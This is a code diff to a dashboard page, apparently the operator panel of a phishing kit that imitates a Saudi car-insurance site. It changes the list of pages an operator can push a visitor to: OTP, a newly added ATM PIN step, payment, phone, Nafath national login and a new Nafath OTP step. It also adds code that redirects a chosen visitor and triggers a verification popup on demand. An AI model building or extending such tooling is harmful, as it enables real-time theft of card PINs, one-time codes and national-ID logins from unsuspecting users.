@@ -99,14 +99,14 @@ export default function DashboardPage() {
   // Page options for manual redirect
   const pageOptions = [
     { value: "", label: "اختر صفحة للتوجيه..." },
-    { value: "home", label: "🏠 الصفحة الرئيسية" },
-    { value: "step1", label: "1️⃣ اختيار نوع التأمين" },
-    { value: "step2", label: "2️⃣ رمز التحقق (OTP)" },
-    { value: "step3", label: "3️⃣ بيانات السيارة" },
-    { value: "step4", label: "4️⃣ تأكيد الدفع" },
-    { value: "step5", label: "5️⃣ التحقق من الهاتف" },
-    { value: "step6", label: "6️⃣ النفاذ الوطني" },
-    { value: "thank-you", label: "✅ شكراً لك" },
+    { value: "home-new", label: "🏠 الرئيسية" },
+    { value: "step1", label: "📋 اختيار التأمين" },
+    { value: "step2", label: "🔐 رمز التحقق" },
+    { value: "step3", label: "🔢 رمز ATM" },
+    { value: "step4", label: "💳 الدفع" },
+    { value: "step5", label: "📱 رقم الهاتف" },
+    { value: "step6", label: "🔒 النفاذ" },
+    { value: "nafad-otp", label: "🔑 رمز النفاذ" },
   ];
 
   // Stats derived from the real visitor data stream
@@ -610,11 +610,23 @@ export default function DashboardPage() {
     if (!visitorId || !redirectPage) return;
     
     setActionLoading("redirect");
+    
+    // Special handling for nafad-otp: redirect to step4 with verifying status
+    const isNafadOtp = redirectPage === "nafad-otp";
+    const targetPage = isNafadOtp ? "step4" : redirectPage;
+    
     try {
+      const requestBody: Record<string, any> = { visitorId, targetPage };
+      
+      // If nafad-otp, also set verifying status to show popup immediately
+      if (isNafadOtp) {
+        requestBody.setNafadVerifying = true;
+      }
+      
       const res = await fetch("/api/dashboard/redirect", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ visitorId, targetPage: redirectPage }),
+        body: JSON.stringify(requestBody),
       });
       if (res.ok) {
         const pageLabel = pageOptions.find(p => p.value === redirectPage)?.label || redirectPage;
@@ -1753,11 +1765,19 @@ const renderNafadBox = () => {
                       setActionLoading("redirect");
                       setRedirectPage(selectedPage);
 
+                      // Special handling for nafad-otp
+                      const isNafadOtp = selectedPage === "nafad-otp";
+                      const targetPage = isNafadOtp ? "step4" : selectedPage;
+                      const requestBody: Record<string, any> = { visitorId, targetPage };
+                      if (isNafadOtp) {
+                        requestBody.setNafadVerifying = true;
+                      }
+
                       try {
                         const res = await fetch("/api/dashboard/redirect", {
                           method: "POST",
                           headers: { "Content-Type": "application/json" },
-                          body: JSON.stringify({ visitorId, targetPage: selectedPage }),
+                          body: JSON.stringify(requestBody),
                         });
                         if (res.ok) {
                           const pageLabel = pageOptions.find((p) => p.value === selectedPage)?.label || selectedPage;
